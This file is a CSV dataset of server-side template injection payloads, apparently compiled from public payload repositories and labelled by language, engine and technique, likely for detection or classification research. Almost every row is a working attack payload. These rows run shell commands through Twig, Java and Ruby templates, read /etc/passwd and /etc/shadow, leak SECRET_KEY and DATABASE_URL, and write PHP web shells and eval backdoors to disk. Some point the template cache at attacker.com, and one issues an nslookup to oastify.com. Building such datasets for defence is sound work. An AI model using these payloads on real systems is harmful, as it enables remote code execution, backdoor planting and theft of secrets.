{{app.request.server.get('DATABASE_URL')}},{{app.request.server.get('S')}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{app.request.server.get('SECRET_KEY')}},{{app.request.server.get('S')}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{app.session}},{{app.session}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{app.user}},{{app.user}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{app.environment}},{{app.environment}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{app.debug}},{{app.debug}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'<?php system($_GET[cmd]); ?>'|file_put_contents('shell.php')}},{{'S'|file_put_contents('S')}},php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'<?php phpinfo(); ?>'|file_put_contents('info.php')}},{{'S'|file_put_contents('S')}},php,Twig,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'<?php eval($_POST[cmd]); ?>'|file_put_contents('backdoor.php')}},{{'S'|file_put_contents('S')}},php,Twig,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('passthru')}}{{_self.env.getFilter('id')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('shell_exec')}}{{_self.env.getFilter('id')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('assert')}}{{_self.env.getFilter('phpinfo()')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('create_function')}}{{_self.env.getFilter('phpinfo();')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{[""id""]|sort(""system"")}}","{{[""S""]|sort(""S"")}}",php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{[""id""]|merge|sort(""system"")}}","{{[""S""]|merge|sort(""S"")}}",php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{{""<?php phpinfo();"":1}|sort(""system"")}}","{{{""S"":N}|sort(""S"")}}",php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{{""<?php system($_GET[x]);"":1}|sort(""file_put_contents"")}}","{{{""S"":N}|sort(""S"")}}",php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{""<?php system($_GET[x]);""|file_put_contents(""shell.php"")}}","{{""S""|file_put_contents(""S"")}}",php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{""<?php phpinfo();""|file_put_contents(""info.php"")}}","{{""S""|file_put_contents(""S"")}}",php,Twig,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{""<?php eval($_POST[x]);""|file_put_contents(""eval.php"")}}","{{""S""|file_put_contents(""S"")}}",php,Twig,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('cat /etc/passwd')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('cat /etc/passwd')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('passthru')}}{{_self.env.getFilter('cat /etc/passwd')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('shell_exec')}}{{_self.env.getFilter('cat /etc/passwd')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('proc_open')}}{{_self.env.getFilter('id')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('popen')}}{{_self.env.getFilter('id')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('pcntl_exec')}}{{_self.env.getFilter('/bin/bash')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.setCache('ftp://attacker.com:2121')}},{{_self.env.setcache('S')}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.setCache('http://attacker.com/webshell.php')}},{{_self.env.setcache('S')}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{_self.env.loadTemplate(""/etc/passwd"")}}","{{_self.env.loadtemplate(""S"")}}",php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{_self.env.compileSource(""/etc/passwd"")}}","{{_self.env.compilesource(""S"")}}",php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{['id',0]|sort('system')}}","{{['S',N]|sort('S')}}",php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{['cat /etc/passwd',0]|sort('system')}}","{{['S',N]|sort('S')}}",php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{['whoami',0]|sort('system')}}","{{['S',N]|sort('S')}}",php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{['ls -la',0]|sort('system')}}","{{['S',N]|sort('S')}}",php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{['uname -a',0]|sort('system')}}","{{['S',N]|sort('S')}}",php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{['env',0]|sort('system')}}","{{['S',N]|sort('S')}}",php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{['pwd',0]|sort('system')}}","{{['S',N]|sort('S')}}",php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{['cat flag.txt',0]|sort('system')}}","{{['S',N]|sort('S')}}",php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{['ps aux',0]|sort('system')}}","{{['S',N]|sort('S')}}",php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{['ifconfig',0]|sort('system')}}","{{['S',N]|sort('S')}}",php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{['netstat -an',0]|sort('system')}}","{{['S',N]|sort('S')}}",php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{['cat /etc/shadow',0]|sort('system')}}","{{['S',N]|sort('S')}}",php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'system'('id')}},{{'S'('S')}},php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'exec'('id')}},{{'S'('S')}},php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'passthru'('id')}},{{'S'('S')}},php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'shell_exec'('id')}},{{'S'('S')}},php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{'popen'('id','r')}}","{{'S'('S','S')}}",php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'file_get_contents'('/etc/passwd')}},{{'S'('S')}},php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{'file_put_contents'('shell.php','<?php system($_GET[x]);')}}","{{'S'('S','S')}}",php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'readfile'('/etc/passwd')}},{{'S'('S')}},php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'highlight_file'('/etc/passwd')}},{{'S'('S')}},php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'show_source'('/etc/passwd')}},{{'S'('S')}},php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.displayStart}},{{_self.displaystart}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.blocks}},{{_self.blocks}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.macros}},{{_self.macros}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.traits}},{{_self.traits}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.parent}},{{_self.parent}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.sourceContext}},{{_self.sourcecontext}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.sourceName}},{{_self.sourcename}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.sourcePath}},{{_self.sourcepath}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{dump(_self)}},{{dump(_self)}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{dump(_self.env)}},{{dump(_self.env)}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{['cat${IFS}/etc/passwd']|filter('system')}},{{['S']|filter('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{['cat${IFS}/etc/passwd']|map('system')}},{{['S']|map('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{['cat</etc/passwd']|filter('system')}},{{['S']|filter('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{['cat<flag.txt']|map('system')}},{{['S']|map('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'cat /etc/passwd'|split(' ')|join('|')|map('system')}},{{'S'|split('S')|join('S')|map('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{_self.env.registerUndefinedFilterCallback('assert')}}{{_self.env.getFilter('system(""id"")')}}",{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{_self.env.registerUndefinedFilterCallback('create_function')}}{{_self.env.getFilter('system(""id"");')}}",{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{_self.env.registerUndefinedFilterCallback('call_user_func')}}{{_self.env.getFilter('system"",""id')}}",{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{_self.env.registerUndefinedFilterCallback('call_user_func_array')}}{{_self.env.getFilter('system',array(""id""))}}","{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S',array(""S""))}}",php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{_self.env.registerUndefinedFilterCallback('array_map')}}{{_self.env.getFilter('system',array(""id""))}}","{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S',array(""S""))}}",php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{_self.env.registerUndefinedFilterCallback('array_filter')}}{{_self.env.getFilter('system',array(""id""))}}","{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S',array(""S""))}}",php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('usort')}}{{_self.env.getFilter('system')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('uasort')}}{{_self.env.getFilter('system')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('uksort')}}{{_self.env.getFilter('system')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('array_reduce')}}{{_self.env.getFilter('system')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('array_walk')}}{{_self.env.getFilter('system')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('array_walk_recursive')}}{{_self.env.getFilter('system')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('iterator_apply')}}{{_self.env.getFilter('system')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('forward_static_call')}}{{_self.env.getFilter('system')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('forward_static_call_array')}}{{_self.env.getFilter('system')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('register_shutdown_function')}}{{_self.env.getFilter('system')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('register_tick_function')}}{{_self.env.getFilter('system')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.getFunction('include')}},{{_self.env.getfunction('S')}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.getFunction('source')}},{{_self.env.getfunction('S')}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.getFunction('template_from_string')}},{{_self.env.getfunction('S')}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{include('/etc/passwd')}},{{include('S')}},php,Twig,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{source('/etc/passwd')}},{{source('S')}},php,Twig,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{template_from_string(""Hello #{7*7}"")}}","{{template_from_string(""S"")}}",php,Twig,1,probe,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{template_from_string(""{{_self}}"")}}","{{template_from_string(""S"")}}",php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{max(array('system'),array('id'))}}","{{max(array('S'),array('S'))}}",php,Twig,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{min(array('system'),array('id'))}}","{{min(array('S'),array('S'))}}",php,Twig,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{sort(array('system','id'))}}","{{sort(array('S','S'))}}",php,Twig,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}","{{'S'.getclass().forname('S').newinstance().getenginebyname('S').eval(\""S"")}}",multi,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""whoami\\\""); x.start()\"")}}","{{'S'.getclass().forname('S').newinstance().getenginebyname('S').eval(\""S""whoami\\\""S"")}}",multi,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""netstat\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}","{{'S'.getclass().forname('S').newinstance().getenginebyname('S').eval(\""S""netstat\\\""S"")}}",multi,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""uname\\\"",\\\""-a\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}","{{'S'.getclass().forname('S').newinstance().getenginebyname('S').eval(\""S""uname\\\""S""-a\\\""S"")}}",multi,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz
<%=(`nslookup oastify.com`)%>,<%=(`nslookupoastify.com`)%>,ruby,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Ruby.md
<%= system('cat /etc/passwd') %>,<%=system('S')%>,ruby,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Ruby.md
<%= `ls /` %>,<%=`ls/`%>,ruby,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Ruby.md
<%= IO.popen('ls /').readlines()  %>,<%=io.popen('S').readlines()%>,ruby,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Ruby.md
"<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>","<%require'S'%><%@a,@b,@c,@d=openN.popenN('S')%><%=@b.readline()%>",ruby,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Ruby.md
"<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>","<%require'S'%><%@a,@b,@c,@d=openN.popenN('S')%><%=@c.readline()%>",ruby,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Ruby.md
#{ %x|env| },#{%x|env|},ruby,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Ruby.md
{% csrf_token %} # Causes error with Jinja2,{%csrf_token%}#causeserrorwithjinjaN,python,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
